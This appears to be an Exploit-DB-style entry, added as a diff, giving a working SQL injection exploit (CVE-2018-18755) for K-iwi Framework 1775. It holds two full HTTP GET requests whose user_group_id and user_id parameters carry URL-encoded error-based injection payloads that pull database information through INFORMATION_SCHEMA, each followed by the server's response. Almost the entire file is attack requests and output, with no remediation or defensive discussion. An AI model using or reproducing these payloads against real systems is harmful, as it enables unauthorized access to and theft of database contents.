@@ -1,0 +1,59 @@
+# Exploit Title: K-iwi Framework 1775 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.k-iwi.com/
+# Software Link: https://sourceforge.net/projects/k-iwi/files/latest/download
+# Version: 1775
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18755
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?route=admin/user/group/update&token=&user_group_id=[SQL]
+# 
+GET /[PATH]/index.php?route=admin/user/group/update&token=036aefc8aabf2ac8f6a4687ce432905d&user_group_id=1%39%20%41%4e%44%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53%45%28%29%20%41%53%20%43%48%41%52%29%2c%30%78%37%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%44%41%54%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:45:01 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=3sm3nbn5lero2rag4hj69ld3d0; path=/
+Set-Cookie: language=it_IT; expires=Sun, 25-Nov-2018 17:56:01 GMT; Max-Age=2592000; path=/; domain=192.168.1.27
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1105
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/index.php?route=admin/user/user/update&token=&user_id=[SQL]
+# 
+GET /[PATH]/index.php?route=admin/user/user/update&token=036aefc8aabf2ac8f6a4687ce432905d&user_id=11%39%20%41%4e%44%28%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53%45%28%29%20%41%53%20%43%48%41%52%29%2c%30%78%37%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%44%41%54%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3sm3nbn5lero2rag4hj69ld3d0; language=it_IT
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 01:52:50 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1105
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
